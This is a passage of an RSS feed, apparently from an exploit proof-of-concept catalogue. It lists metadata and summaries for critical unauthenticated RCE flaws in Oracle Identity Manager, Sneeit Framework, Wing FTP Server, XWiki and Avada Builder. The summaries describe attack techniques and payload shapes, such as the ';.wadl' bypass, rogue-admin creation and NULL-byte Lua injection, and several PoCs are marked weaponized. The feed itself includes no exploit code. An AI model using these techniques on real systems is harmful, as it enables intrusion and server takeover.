+ &lt;th>Value&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td>&lt;strong>Date Added&lt;/strong>&lt;/td>
+ &lt;td>2026-07-06&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Last Updated&lt;/strong>&lt;/td>
+ &lt;td>2026-07-06&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Author / Researcher&lt;/strong>&lt;/td>
+ &lt;td>Jinxia62 (金夏安全)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>CVE / Advisory&lt;/strong>&lt;/td>
+ &lt;td>CVE-2025-61757&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Category&lt;/strong>&lt;/td>
+ &lt;td>web&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Severity&lt;/strong>&lt;/td>
+ &lt;td>Critical&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>CVSS Score&lt;/strong>&lt;/td>
+ &lt;td>9.8&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Status&lt;/strong>&lt;/td>
+ &lt;td>PoC&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Tags&lt;/strong>&lt;/td>
+ &lt;td>oracle, identity-manager, oim, authentication-bypass, rce, groovy, wadl, security-filter, cwe-287, cwe-94&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Related&lt;/strong>&lt;/td>
+ &lt;td>N/A&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;hr>
+&lt;h2 id="affected-target">Affected Target&lt;/h2>
+&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th>Field&lt;/th>
+ &lt;th>Value&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td>&lt;strong>Software / System&lt;/strong>&lt;/td>
+ &lt;td>Oracle Identity Manager (OIM) — &lt;code>applicationmanagement&lt;/code> REST API&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Versions Affected&lt;/strong>&lt;/td>
+ &lt;td>Oracle Identity Manager instances exposing the &lt;code>/iam/governance/applicationmanagement/api/v1/applications/groovyscriptstatus&lt;/code> endpoint (unpatched)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Language / Platform&lt;/strong>&lt;/td>
+ &lt;td>Java / WebLogic-hosted REST API, Groovy scripting engine&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Authentication Required&lt;/strong>&lt;/td>
+ &lt;td>None (bypassed)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Network Access Required&lt;/strong>&lt;/td>
+ &lt;td>Yes (HTTP/HTTPS access to the OIM management port, typically 7001)&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;hr>
+&lt;h2 id="summary">Summary&lt;/h2>
+&lt;p>Oracle Identity Manager&amp;rsquo;s &lt;code>SecurityFilter&lt;/code> fails to correctly normalize request URIs before applying its authentication check. By appending a &lt;code>;.wadl&lt;/code> matrix-parameter suffix to the path of the &lt;code>groovyscriptstatus&lt;/code> endpoint, an unauthenticated attacker can bypass &lt;code>SecurityFilter&lt;/code> entirely and reach the underlying servlet directly. That servlet accepts a JSON body containing a &lt;code>script&lt;/code> field and a &lt;code>compile: true&lt;/code> flag, compiles the supplied Groovy source, and executes it server-side — because Groovy&amp;rsquo;s &lt;code>String.execute()&lt;/code> spawns an OS process, this yields unauthenticated remote code execution as the OIM/WebLogic service account.&lt;/p></description></item><item><title>Sneeit Framework &lt;= 8.3 Unauthenticated RCE via `call_user_func()` — Rogue Admin Creation (CVE-2025-6389)</title><link>https://poc.intelseclab.com/pocs/web/2026-07-06_cve-2025-6389-wordpress-rogue-admin-user-creation/</link><pubDate>Mon, 06 Jul 2026 00:00:00 +0000</pubDate><guid>https://poc.intelseclab.com/pocs/web/2026-07-06_cve-2025-6389-wordpress-rogue-admin-user-creation/</guid><description>&lt;h2 id="metadata">Metadata&lt;/h2>
+&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th>Field&lt;/th>
+ &lt;th>Value&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td>&lt;strong>Date Added&lt;/strong>&lt;/td>
+ &lt;td>2026-07-06&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Last Updated&lt;/strong>&lt;/td>
+ &lt;td>2026-07-06&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Author / Researcher&lt;/strong>&lt;/td>
+ &lt;td>Nxploited (Khaled Alenazi)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>CVE / Advisory&lt;/strong>&lt;/td>
+ &lt;td>CVE-2025-6389&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Category&lt;/strong>&lt;/td>
+ &lt;td>web&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Severity&lt;/strong>&lt;/td>
+ &lt;td>Critical&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>CVSS Score&lt;/strong>&lt;/td>
+ &lt;td>9.8 (CVSSv3.1: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Status&lt;/strong>&lt;/td>
+ &lt;td>Weaponized&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Tags&lt;/strong>&lt;/td>
+ &lt;td>wordpress, sneeit-framework, rce, call_user_func, unauthenticated, wp_insert_user, privilege-escalation, admin-takeover, cwe-94, wp-ajax-nopriv&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Related&lt;/strong>&lt;/td>
+ &lt;td>N/A&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;hr>
+&lt;h2 id="affected-target">Affected Target&lt;/h2>
+&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th>Field&lt;/th>
+ &lt;th>Value&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td>&lt;strong>Software / System&lt;/strong>&lt;/td>
+ &lt;td>Sneeit Framework (WordPress theme framework plugin, &lt;code>sneeit-framework&lt;/code>)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Versions Affected&lt;/strong>&lt;/td>
+ &lt;td>All versions up to and including 8.3&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Language / Platform&lt;/strong>&lt;/td>
+ &lt;td>PHP / WordPress plugin (AJAX handler)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Authentication Required&lt;/strong>&lt;/td>
+ &lt;td>No&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Network Access Required&lt;/strong>&lt;/td>
+ &lt;td>Yes&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;hr>
+&lt;h2 id="summary">Summary&lt;/h2>
+&lt;p>The Sneeit Framework plugin for WordPress registers an unauthenticated AJAX action, &lt;code>sneeit_articles_pagination&lt;/code>, whose callback function &lt;code>sneeit_articles_pagination_callback()&lt;/code> takes a function name and a JSON-encoded argument list straight from &lt;code>$_POST['callback']&lt;/code> and &lt;code>$_POST['args']&lt;/code> and passes them directly into PHP&amp;rsquo;s &lt;code>call_user_func()&lt;/code> with no validation or allow-list. Because the action is hooked via &lt;code>wp_ajax_nopriv_sneeit_articles_pagination&lt;/code>, it is reachable by any unauthenticated visitor. An attacker can invoke arbitrary PHP/WordPress functions with arbitrary arguments — including &lt;code>wp_insert_user&lt;/code> — to silently create a new WordPress account with the &lt;code>administrator&lt;/code> role, or invoke other functions for broader remote code execution.&lt;/p></description></item><item><title>Wing FTP Server NULL-Byte Lua Injection Unauthenticated RCE (CVE-2025-47812)</title><link>https://poc.intelseclab.com/pocs/web/2026-07-06_cve-2025-47812-wingftp-null-byte-lua-rce/</link><pubDate>Mon, 06 Jul 2026 00:00:00 +0000</pubDate><guid>https://poc.intelseclab.com/pocs/web/2026-07-06_cve-2025-47812-wingftp-null-byte-lua-rce/</guid><description>&lt;h2 id="metadata">Metadata&lt;/h2>
+&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th>Field&lt;/th>
+ &lt;th>Value&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td>&lt;strong>Date Added&lt;/strong>&lt;/td>
+ &lt;td>2026-07-06&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Last Updated&lt;/strong>&lt;/td>
+ &lt;td>2026-07-06&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Author / Researcher&lt;/strong>&lt;/td>
+ &lt;td>0xS4N4TG (this rewrite); original PoC by 4m3rr0r; vulnerability research by Julien (@MrTuxracer)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>CVE / Advisory&lt;/strong>&lt;/td>
+ &lt;td>CVE-2025-47812&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Category&lt;/strong>&lt;/td>
+ &lt;td>web&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Severity&lt;/strong>&lt;/td>
+ &lt;td>Critical&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>CVSS Score&lt;/strong>&lt;/td>
+ &lt;td>10.0 (per NVD)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Status&lt;/strong>&lt;/td>
+ &lt;td>Weaponized&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Tags&lt;/strong>&lt;/td>
+ &lt;td>wingftp, ftp-server, null-byte-injection, lua-injection, unauthenticated-rce, session-file, cwe-94, cwe-158, python&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Related&lt;/strong>&lt;/td>
+ &lt;td>N/A&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;hr>
+&lt;h2 id="affected-target">Affected Target&lt;/h2>
+&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th>Field&lt;/th>
+ &lt;th>Value&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td>&lt;strong>Software / System&lt;/strong>&lt;/td>
+ &lt;td>Wing FTP Server, web administration/login interface (&lt;code>loginok.html&lt;/code>, session mechanism)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Versions Affected&lt;/strong>&lt;/td>
+ &lt;td>&amp;lt;= 7.4.3 (fixed in 7.4.4)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Language / Platform&lt;/strong>&lt;/td>
+ &lt;td>Python 3 (exploit); Lua session backend (target, executes as &lt;code>root&lt;/code>/&lt;code>SYSTEM&lt;/code>)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Authentication Required&lt;/strong>&lt;/td>
+ &lt;td>No&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Network Access Required&lt;/strong>&lt;/td>
+ &lt;td>Yes&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;hr>
+&lt;h2 id="summary">Summary&lt;/h2>
+&lt;p>Wing FTP Server&amp;rsquo;s authentication routine &lt;code>c_CheckUser()&lt;/code> truncates the supplied &lt;code>username&lt;/code> at the first NULL byte (&lt;code>%00&lt;/code>) when validating credentials, but the code path that subsequently writes the session file persists the &lt;em>full&lt;/em>, unsanitized username — including anything after the NULL byte — into a Lua session file on disk. By submitting a username such as &lt;code>anonymous%00]]&amp;lt;lua-code&amp;gt;--&lt;/code>, an attacker causes the truncated value to pass authentication as &lt;code>anonymous&lt;/code> while the raw string (which closes the Lua string literal, injects arbitrary Lua, then comments out the remainder) is written verbatim into the session file. When any authenticated page (e.g. &lt;code>dir.html&lt;/code>) is subsequently loaded, the server reads the session file via &lt;code>loadfile()&lt;/code> and executes it as Lua code, running the attacker&amp;rsquo;s injected &lt;code>os.execute()&lt;/code>/&lt;code>io.popen()&lt;/code> calls as &lt;code>root&lt;/code> (Linux) or &lt;code>SYSTEM&lt;/code> (Windows). The included PoC (&lt;code>exploit.py&lt;/code>) automates the NULL-byte injection login, triggers execution via &lt;code>dir.html&lt;/code>, and supports vulnerability checking, blocking command execution, detached/backgrounded command execution, and one-shot bash reverse shell delivery.&lt;/p></description></item><item><title>XWiki SolrSearch Macro Unauthenticated Groovy RCE (CVE-2025-24893)</title><link>https://poc.intelseclab.com/pocs/web/2026-07-06_cve-2025-24893-xwiki-solrsearch-groovy-rce/</link><pubDate>Mon, 06 Jul 2026 00:00:00 +0000</pubDate><guid>https://poc.intelseclab.com/pocs/web/2026-07-06_cve-2025-24893-xwiki-solrsearch-groovy-rce/</guid><description>&lt;h2 id="metadata">Metadata&lt;/h2>
+&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th>Field&lt;/th>
+ &lt;th>Value&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td>&lt;strong>Date Added&lt;/strong>&lt;/td>
+ &lt;td>2026-07-06&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Last Updated&lt;/strong>&lt;/td>
+ &lt;td>2026-07-06&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Author / Researcher&lt;/strong>&lt;/td>
+ &lt;td>dollarboysushil&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>CVE / Advisory&lt;/strong>&lt;/td>
+ &lt;td>CVE-2025-24893&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Category&lt;/strong>&lt;/td>
+ &lt;td>web&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Severity&lt;/strong>&lt;/td>
+ &lt;td>Critical&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>CVSS Score&lt;/strong>&lt;/td>
+ &lt;td>9.8 (per NVD)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Status&lt;/strong>&lt;/td>
+ &lt;td>Weaponized&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Tags&lt;/strong>&lt;/td>
+ &lt;td>xwiki, groovy, rce, unauthenticated, cwe-94, code-injection, reverse-shell, python, wiki&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Related&lt;/strong>&lt;/td>
+ &lt;td>N/A&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;hr>
+&lt;h2 id="affected-target">Affected Target&lt;/h2>
+&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th>Field&lt;/th>
+ &lt;th>Value&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td>&lt;strong>Software / System&lt;/strong>&lt;/td>
+ &lt;td>XWiki (SolrSearch macro, &lt;code>Main.SolrSearch&lt;/code>)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Versions Affected&lt;/strong>&lt;/td>
+ &lt;td>XWiki &amp;lt; 15.10.11, 16.4.1, 16.5.0RC1 (tested against 15.10.8)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Language / Platform&lt;/strong>&lt;/td>
+ &lt;td>Groovy payload delivered via HTTP GET; PoC exploit client written in Python; target runs on JVM (Tomcat/Jetty)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Authentication Required&lt;/strong>&lt;/td>
+ &lt;td>No&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Network Access Required&lt;/strong>&lt;/td>
+ &lt;td>Yes&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;hr>
+&lt;h2 id="summary">Summary&lt;/h2>
+&lt;p>CVE-2025-24893 is a critical unauthenticated remote code execution vulnerability in XWiki, caused by the built-in &lt;code>SolrSearch&lt;/code> macro (&lt;code>Main.SolrSearch&lt;/code>) passing user-supplied search input into a Groovy evaluation context without sanitization. By crafting a GET request whose &lt;code>text&lt;/code> parameter closes the wiki-syntax context and opens an &lt;code>{{async}}{{groovy}}...{{/groovy}}{{/async}}&lt;/code> block, an anonymous attacker can get arbitrary Groovy code executed server-side. The PoC in this repository is a Python exploit script that builds a base64-encoded reverse-shell payload, wraps it in the Groovy injection syntax, URL-encodes it, and fires it at the vulnerable endpoint via &lt;code>curl&lt;/code>, giving the attacker an interactive shell on the XWiki host.&lt;/p></description></item><item><title>Avada Builder Unauthenticated RCE via call_user_func() Allowlist Bypass (CVE-2026-6279)</title><link>https://poc.intelseclab.com/pocs/web/2026-07-05_cve-2026-6279-avada-builder-rce/</link><pubDate>Sun, 05 Jul 2026 00:00:00 +0000</pubDate><guid>https://poc.intelseclab.com/pocs/web/2026-07-05_cve-2026-6279-avada-builder-rce/</guid><description>&lt;h2 id="metadata">Metadata&lt;/h2>
 &lt;table>
  &lt;thead>
  &lt;tr>
